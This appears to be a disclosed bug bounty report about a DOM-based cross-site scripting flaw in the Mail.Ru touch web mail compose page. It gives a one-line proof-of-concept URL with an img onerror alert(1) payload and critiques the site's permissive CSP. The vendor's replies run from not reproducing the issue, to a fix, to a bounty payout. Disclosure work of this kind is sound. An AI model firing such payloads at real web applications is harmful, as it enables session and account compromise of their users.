title: XSS touch.mail.ru compose Body

activities.message:
h1 can spoil the link, copy-paste
```
https://touch.mail.ru/messages/#sentmsg?Body=<img%20src%20onerror%3dalert(1)>
```

CSP is not strict at all
```
default-src
	blob:
	wss://*.mail.ru
	https://www.google.com/recaptcha/
	https://*.mail.ru
	https://*.yandex.ru
	https://*.radar.imgsmail.ru;
script-src
	'self'
	'unsafe-inline'
	'unsafe-eval'
	https://*.mail.ru
	https://img.imgsmail.ru
	https://portal.mail.ru
	https://ad.mail.ru
	https://*.yandex.ru;
img-src
	data:
	blob:
	https:;
style-src
	'self'
	'unsafe-inline'
	'unsafe-eval'
	https://*.mail.ru
	https://img.imgsmail.ru;
font-src
	data:
	https://*.mail.ru
	https://*.imgsmail.ru;
report-uri
	https://cspreport.mail.ru/
```

Thank you for reporting your bug to Mail.Ru Group!   We appreciate your time to helping us to make our web services safer.

We cannot reproduce the issue, this hashtag is reflected URI-encoded.
 Can you provide additional info about discovered vulnerability,  system/browser information, brief steps to reproduce it (e.g. how the link is injected into browser), screenshots or a working proof-of-concept?

Hello,
this problem was mitigated with a temporary workaround. A final fix is still in production.

This bug has been fixed! 
Please confirm that you are no longer able to reproduce the issue.

Hello, 

bug bounty reward is transferred to your account. You can set payment options and request payout via
https://hackerone.com/settings/bounties

Thanks again,
waiting for new bug reports from you.

summaries.content: Browser specific DOM-based XSS in web mail for devices with touch interface.

user.name: Vladimir Dubrovin
user.bio: En la agostada senda he visto al buen lagarto (gota de cocodrilo) meditando.
